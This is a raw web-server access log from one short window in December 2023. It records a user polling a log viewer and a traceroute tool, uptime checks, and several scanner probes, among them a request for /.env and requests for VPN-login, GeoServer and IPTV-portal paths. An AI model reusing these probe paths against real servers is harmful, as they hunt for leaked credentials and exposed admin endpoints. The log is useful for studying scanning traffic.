173.48.140.140 - - [19/Dec/2023:04:34:35 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 1507 "-" "-" 7836 "www@docker" "http://172.18.0.9:80" 12ms
167.71.120.76 - - [19/Dec/2023:04:34:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7837 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:34:42 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 1503 "-" "-" 7838 "www@docker" "http://172.18.0.9:80" 12ms
173.48.140.140 - - [19/Dec/2023:04:34:44 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 1507 "-" "-" 7839 "www@docker" "http://172.18.0.9:80" 13ms
173.48.140.140 - - [19/Dec/2023:04:34:46 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 1507 "-" "-" 7840 "www@docker" "http://172.18.0.9:80" 14ms
199.45.155.19 - - [19/Dec/2023:04:35:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7841 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:04:35:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7842 "www@docker" "http://172.18.0.9:80" 1ms
199.45.155.19 - - [19/Dec/2023:04:35:25 +0000] "GET / HTTP/1.1" 200 334 "-" "-" 7843 "www@docker" "http://172.18.0.9:80" 26ms
199.45.155.19 - - [19/Dec/2023:04:35:30 +0000] "GET /favicon.ico HTTP/1.1" 404 153 "-" "-" 7844 "www@docker" "http://172.18.0.9:80" 2ms
167.71.120.76 - - [19/Dec/2023:04:35:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7845 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:35:47 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 1170 "-" "-" 7846 "www@docker" "http://172.18.0.9:80" 19ms
173.48.140.140 - - [19/Dec/2023:04:35:53 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1086 "-" "-" 7847 "www@docker" "http://172.18.0.9:80" 31ms
173.48.140.140 - - [19/Dec/2023:04:36:00 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1121 "-" "-" 7848 "www@docker" "http://172.18.0.9:80" 9ms
173.48.140.140 - - [19/Dec/2023:04:36:01 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1172 "-" "-" 7849 "www@docker" "http://172.18.0.9:80" 8ms
64.62.197.121 - - [19/Dec/2023:04:36:07 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 7850 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:04:36:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7851 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:36:29 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1200 "-" "-" 7852 "www@docker" "http://172.18.0.9:80" 13ms
173.48.140.140 - - [19/Dec/2023:04:36:30 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1200 "-" "-" 7853 "www@docker" "http://172.18.0.9:80" 9ms
167.71.120.76 - - [19/Dec/2023:04:36:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7854 "www@docker" "http://172.18.0.9:80" 0ms
34.140.248.32 - - [19/Dec/2023:04:36:48 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7855 "web-to-websecure@internal" "-" 0ms
173.48.140.140 - - [19/Dec/2023:04:36:59 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 7856 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:36:59 +0000] "GET /logs/styles.css?version=15 HTTP/2.0" 304 0 "-" "-" 7857 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:36:59 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 987 "-" "-" 7858 "www@docker" "http://172.18.0.9:80" 11ms
64.62.197.109 - - [19/Dec/2023:04:37:05 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 7859 "-" "-" 0ms
173.48.140.140 - - [19/Dec/2023:04:37:06 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1047 "-" "-" 7860 "www@docker" "http://172.18.0.9:80" 6ms
173.48.140.140 - - [19/Dec/2023:04:37:09 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1078 "-" "-" 7861 "www@docker" "http://172.18.0.9:80" 6ms
159.203.109.206 - - [19/Dec/2023:04:37:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7862 "www@docker" "http://172.18.0.9:80" 0ms
64.62.197.114 - - [19/Dec/2023:04:37:27 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7863 "-" "-" 0ms
173.48.140.140 - - [19/Dec/2023:04:37:28 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1005 "-" "-" 7864 "www@docker" "http://172.18.0.9:80" 8ms
173.48.140.140 - - [19/Dec/2023:04:37:29 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 999 "-" "-" 7865 "www@docker" "http://172.18.0.9:80" 6ms
167.71.120.76 - - [19/Dec/2023:04:37:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7866 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:37:38 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 943 "-" "-" 7867 "www@docker" "http://172.18.0.9:80" 86ms
173.48.140.140 - - [19/Dec/2023:04:37:40 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 993 "-" "-" 7868 "www@docker" "http://172.18.0.9:80" 9ms
159.203.109.206 - - [19/Dec/2023:04:38:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7869 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:38:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7870 "www@docker" "http://172.18.0.9:80" 0ms
64.62.197.109 - - [19/Dec/2023:04:38:48 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 7871 "-" "-" 0ms
69.164.217.245 - - [19/Dec/2023:04:38:50 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7872 "-" "-" 0ms
45.79.181.179 - - [19/Dec/2023:04:39:03 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7873 "-" "-" 0ms
64.62.197.116 - - [19/Dec/2023:04:39:05 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 7874 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:04:39:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7875 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:39:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7876 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:39:40 +0000] "GET /logs/ HTTP/2.0" 200 1976 "-" "-" 7877 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:39:40 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 901 "-" "-" 7878 "www@docker" "http://172.18.0.9:80" 16ms
64.62.197.120 - - [19/Dec/2023:04:40:14 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 7879 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:04:40:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7880 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:04:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7881 "www@docker" "http://172.18.0.9:80" 72ms
159.203.109.206 - - [19/Dec/2023:04:41:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7882 "www@docker" "http://172.18.0.9:80" 5ms
167.71.120.76 - - [19/Dec/2023:04:41:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7883 "www@docker" "http://172.18.0.9:80" 2ms
159.203.109.206 - - [19/Dec/2023:04:42:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7884 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:04:42:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7885 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:04:43:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7886 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:43:23 +0000] "GET /logs/ HTTP/2.0" 200 2450 "-" "-" 7887 "www@docker" "http://172.18.0.9:80" 2ms
173.48.140.140 - - [19/Dec/2023:04:43:23 +0000] "GET /logs/styles.css?version=15 HTTP/2.0" 200 1778 "-" "-" 7888 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:43:23 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 922 "-" "-" 7889 "www@docker" "http://172.18.0.9:80" 147ms
173.48.140.140 - - [19/Dec/2023:04:43:28 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 831 "-" "-" 7890 "www@docker" "http://172.18.0.9:80" 9ms
173.48.140.140 - - [19/Dec/2023:04:43:30 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 939 "-" "-" 7891 "www@docker" "http://172.18.0.9:80" 9ms
173.48.140.140 - - [19/Dec/2023:04:43:31 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 890 "-" "-" 7892 "www@docker" "http://172.18.0.9:80" 10ms
173.48.140.140 - - [19/Dec/2023:04:43:33 +0000] "GET /logs/logtail.php?page=4 HTTP/2.0" 200 937 "-" "-" 7893 "www@docker" "http://172.18.0.9:80" 9ms
173.48.140.140 - - [19/Dec/2023:04:43:34 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1089 "-" "-" 7894 "www@docker" "http://172.18.0.9:80" 6ms
167.71.120.76 - - [19/Dec/2023:04:43:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7895 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:04:44:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7896 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:04:44:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7897 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:04:45:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7898 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:45:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7899 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:46:06 +0000] "GET /logs/ HTTP/2.0" 200 2442 "-" "-" 7900 "www@docker" "http://172.18.0.9:80" 3ms
173.48.140.140 - - [19/Dec/2023:04:46:06 +0000] "GET /logs/styles.css?version=15 HTTP/2.0" 200 1778 "-" "-" 7901 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:46:06 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 918 "-" "-" 7902 "www@docker" "http://172.18.0.9:80" 66ms
159.203.109.206 - - [19/Dec/2023:04:46:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7903 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:46:27 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 7904 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:46:27 +0000] "GET /logs/styles.css?version=15 HTTP/2.0" 200 1778 "-" "-" 7905 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:46:27 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1027 "-" "-" 7906 "www@docker" "http://172.18.0.9:80" 19ms
167.71.120.76 - - [19/Dec/2023:04:46:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7907 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:46:54 +0000] "GET /logs/ HTTP/2.0" 200 2449 "-" "-" 7908 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:46:54 +0000] "GET /logs/styles.css?version=15 HTTP/2.0" 304 0 "-" "-" 7909 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:46:54 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1024 "-" "-" 7910 "www@docker" "http://172.18.0.9:80" 11ms
173.48.140.140 - - [19/Dec/2023:04:46:57 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1021 "-" "-" 7911 "www@docker" "http://172.18.0.9:80" 6ms
173.48.140.140 - - [19/Dec/2023:04:46:59 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1021 "-" "-" 7912 "www@docker" "http://172.18.0.9:80" 13ms
173.48.140.140 - - [19/Dec/2023:04:47:01 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 970 "-" "-" 7913 "www@docker" "http://172.18.0.9:80" 7ms
173.48.140.140 - - [19/Dec/2023:04:47:02 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 972 "-" "-" 7914 "www@docker" "http://172.18.0.9:80" 8ms
173.48.140.140 - - [19/Dec/2023:04:47:03 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 827 "-" "-" 7915 "www@docker" "http://172.18.0.9:80" 11ms
173.48.140.140 - - [19/Dec/2023:04:47:08 +0000] "GET /logs/logtail.php?page=4 HTTP/2.0" 200 1036 "-" "-" 7916 "www@docker" "http://172.18.0.9:80" 10ms
173.48.140.140 - - [19/Dec/2023:04:47:09 +0000] "GET /logs/logtail.php?page=5 HTTP/2.0" 200 1076 "-" "-" 7917 "www@docker" "http://172.18.0.9:80" 9ms
173.48.140.140 - - [19/Dec/2023:04:47:10 +0000] "GET /logs/logtail.php?page=6 HTTP/2.0" 200 864 "-" "-" 7918 "www@docker" "http://172.18.0.9:80" 13ms
173.48.140.140 - - [19/Dec/2023:04:47:12 +0000] "GET /logs/logtail.php?page=7 HTTP/2.0" 200 852 "-" "-" 7919 "www@docker" "http://172.18.0.9:80" 20ms
173.48.140.140 - - [19/Dec/2023:04:47:14 +0000] "GET /logs/logtail.php?page=8 HTTP/2.0" 200 939 "-" "-" 7920 "www@docker" "http://172.18.0.9:80" 15ms
173.48.140.140 - - [19/Dec/2023:04:47:16 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1091 "-" "-" 7921 "www@docker" "http://172.18.0.9:80" 7ms
159.203.109.206 - - [19/Dec/2023:04:47:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7922 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:47:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7923 "www@docker" "http://172.18.0.9:80" 2ms
57.129.23.166 - - [19/Dec/2023:04:48:01 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 7924 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [19/Dec/2023:04:48:02 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 7925 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:04:48:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7926 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:48:30 +0000] "GET /logs/ HTTP/2.0" 200 2409 "-" "-" 7927 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:48:31 +0000] "GET /logs/styles.css?version=15 HTTP/2.0" 304 0 "-" "-" 7928 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:48:31 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 918 "-" "-" 7929 "www@docker" "http://172.18.0.9:80" 12ms
167.71.120.76 - - [19/Dec/2023:04:48:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7930 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:49:02 +0000] "GET /logs/ HTTP/2.0" 200 2466 "-" "-" 7931 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:49:02 +0000] "GET /logs/styles.css?version=15 HTTP/2.0" 304 0 "-" "-" 7932 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:49:02 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1020 "-" "-" 7933 "www@docker" "http://172.18.0.9:80" 12ms
159.203.109.206 - - [19/Dec/2023:04:49:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7934 "www@docker" "http://172.18.0.9:80" 1ms
117.245.168.40 - - [19/Dec/2023:04:49:26 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7935 "web-to-websecure@internal" "-" 0ms
117.245.168.40 - - [19/Dec/2023:04:49:26 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7936 "web-to-websecure@internal" "-" 0ms
117.245.168.40 - - [19/Dec/2023:04:49:26 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7937 "web-to-websecure@internal" "-" 0ms
117.245.168.40 - - [19/Dec/2023:04:49:26 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7938 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:04:49:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7939 "www@docker" "http://172.18.0.9:80" 2ms
173.48.140.140 - - [19/Dec/2023:04:49:41 +0000] "GET /logs/ HTTP/2.0" 200 2465 "-" "-" 7940 "www@docker" "http://172.18.0.9:80" 7ms
173.48.140.140 - - [19/Dec/2023:04:49:41 +0000] "GET /logs/styles.css?version=15 HTTP/2.0" 304 0 "-" "-" 7941 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:49:41 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 913 "-" "-" 7942 "www@docker" "http://172.18.0.9:80" 751ms
173.48.140.140 - - [19/Dec/2023:04:50:20 +0000] "GET /logs/ HTTP/2.0" 200 2459 "-" "-" 7943 "www@docker" "http://172.18.0.9:80" 44ms
173.48.140.140 - - [19/Dec/2023:04:50:20 +0000] "GET /logs/styles.css?version=15 HTTP/2.0" 304 0 "-" "-" 7944 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:50:20 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1057 "-" "-" 7945 "www@docker" "http://172.18.0.9:80" 41ms
159.203.109.206 - - [19/Dec/2023:04:50:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7946 "www@docker" "http://172.18.0.9:80" 41ms
173.48.140.140 - - [19/Dec/2023:04:50:22 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 7947 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:50:22 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1004 "-" "-" 7948 "www@docker" "http://172.18.0.9:80" 6ms
167.71.120.76 - - [19/Dec/2023:04:50:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7949 "www@docker" "http://172.18.0.9:80" 20ms
159.203.109.206 - - [19/Dec/2023:04:51:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7950 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:51:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7951 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:51:49 +0000] "GET /logs/ HTTP/2.0" 200 2455 "-" "-" 7952 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:51:49 +0000] "GET /logs/styles.css?version=15 HTTP/2.0" 304 0 "-" "-" 7953 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:51:49 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 915 "-" "-" 7954 "www@docker" "http://172.18.0.9:80" 31ms
180.149.125.168 - - [19/Dec/2023:04:52:17 +0000] "GET /stalker_portal/server/tools/auth_simple.php HTTP/1.1" 301 17 "-" "-" 7955 "web-to-websecure@internal" "-" 0ms
180.149.125.168 - - [19/Dec/2023:04:52:18 +0000] "GET /stalker_portal/server/tools/auth_simple.php HTTP/1.1" 404 19 "-" "-" 7956 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:04:52:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7957 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:52:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7958 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:52:50 +0000] "GET /logs/ HTTP/2.0" 200 2405 "-" "-" 7959 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:52:50 +0000] "GET /logs/styles.css?version=15 HTTP/2.0" 200 1795 "-" "-" 7960 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:52:53 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 7962 "www@docker" "http://172.18.0.9:80" 3ms
173.48.140.140 - - [19/Dec/2023:04:52:50 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 499 21 "-" "-" 7961 "www@docker" "http://172.18.0.9:80" 3383ms
173.48.140.140 - - [19/Dec/2023:04:52:54 +0000] "GET /logs/styles.css?version=15 HTTP/2.0" 304 0 "-" "-" 7963 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:52:54 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1056 "-" "-" 7964 "www@docker" "http://172.18.0.9:80" 14ms
159.203.109.206 - - [19/Dec/2023:04:53:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7965 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:53:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7966 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:04:54:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7967 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:54:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7968 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:04:55:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7969 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:04:55:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7970 "www@docker" "http://172.18.0.9:80" 2ms
173.48.140.140 - - [19/Dec/2023:04:55:43 +0000] "GET /trace/ HTTP/2.0" 200 6089 "-" "-" 7971 "livetrace@docker" "http://172.18.0.3:80" 85ms
173.48.140.140 - - [19/Dec/2023:04:55:43 +0000] "GET /trace/styles.css?version=13 HTTP/2.0" 304 0 "-" "-" 7972 "livetrace@docker" "http://172.18.0.3:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:55:54 +0000] "GET /trace/starttrace.php?id=tgyx9nkag HTTP/2.0" 200 106 "-" "-" 7974 "livetrace@docker" "http://172.18.0.3:80" 12ms
173.48.140.140 - - [19/Dec/2023:04:55:54 +0000] "GET /trace/startping.php?id=qes6tgsn1 HTTP/2.0" 200 105 "-" "-" 7973 "livetrace@docker" "http://172.18.0.3:80" 22ms
173.48.140.140 - - [19/Dec/2023:04:55:55 +0000] "GET /trace/polltrace.php?id=tgyx9nkag HTTP/2.0" 200 263 "-" "-" 7975 "livetrace@docker" "http://172.18.0.3:80" 10ms
173.48.140.140 - - [19/Dec/2023:04:55:55 +0000] "GET /trace/pollping.php?id=qes6tgsn1 HTTP/2.0" 200 34 "-" "-" 7976 "livetrace@docker" "http://172.18.0.3:80" 17ms
173.48.140.140 - - [19/Dec/2023:04:55:56 +0000] "GET /trace/polltrace.php?id=tgyx9nkag HTTP/2.0" 200 263 "-" "-" 7977 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:04:55:56 +0000] "GET /trace/pollping.php?id=qes6tgsn1 HTTP/2.0" 200 53 "-" "-" 7978 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:55:57 +0000] "GET /trace/polltrace.php?id=tgyx9nkag HTTP/2.0" 200 263 "-" "-" 7979 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:55:57 +0000] "GET /trace/pollping.php?id=qes6tgsn1 HTTP/2.0" 200 80 "-" "-" 7980 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:55:58 +0000] "GET /trace/polltrace.php?id=tgyx9nkag HTTP/2.0" 200 303 "-" "-" 7981 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:04:55:58 +0000] "GET /trace/pollping.php?id=qes6tgsn1 HTTP/2.0" 200 106 "-" "-" 7982 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:04:55:59 +0000] "GET /trace/polltrace.php?id=tgyx9nkag HTTP/2.0" 200 303 "-" "-" 7983 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:04:55:59 +0000] "GET /trace/pollping.php?id=qes6tgsn1 HTTP/2.0" 200 131 "-" "-" 7984 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:56:00 +0000] "GET /trace/polltrace.php?id=tgyx9nkag HTTP/2.0" 200 303 "-" "-" 7985 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:56:00 +0000] "GET /trace/pollping.php?id=qes6tgsn1 HTTP/2.0" 200 155 "-" "-" 7986 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:56:01 +0000] "GET /trace/polltrace.php?id=tgyx9nkag HTTP/2.0" 200 343 "-" "-" 7987 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:56:01 +0000] "GET /trace/pollping.php?id=qes6tgsn1 HTTP/2.0" 200 179 "-" "-" 7988 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:56:02 +0000] "GET /trace/polltrace.php?id=tgyx9nkag HTTP/2.0" 200 343 "-" "-" 7989 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:56:02 +0000] "GET /trace/pollping.php?id=qes6tgsn1 HTTP/2.0" 200 200 "-" "-" 7990 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:04:56:02 +0000] "GET /trace/cleanping.php?id=qes6tgsn1 HTTP/2.0" 200 71 "-" "-" 7991 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:04:56:03 +0000] "GET /trace/polltrace.php?id=tgyx9nkag HTTP/2.0" 200 343 "-" "-" 7992 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:56:04 +0000] "GET /trace/polltrace.php?id=tgyx9nkag HTTP/2.0" 200 383 "-" "-" 7993 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:04:56:05 +0000] "GET /trace/polltrace.php?id=tgyx9nkag HTTP/2.0" 200 383 "-" "-" 7994 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:56:06 +0000] "GET /trace/polltrace.php?id=tgyx9nkag HTTP/2.0" 200 383 "-" "-" 7995 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:56:07 +0000] "GET /trace/polltrace.php?id=tgyx9nkag HTTP/2.0" 200 567 "-" "-" 7996 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:56:07 +0000] "GET /trace/cleantrace.php?id=tgyx9nkag HTTP/2.0" 200 72 "-" "-" 7997 "livetrace@docker" "http://172.18.0.3:80" 3ms
159.203.109.206 - - [19/Dec/2023:04:56:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7998 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:56:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7999 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:57:19 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 8000 "www@docker" "http://172.18.0.9:80" 0ms
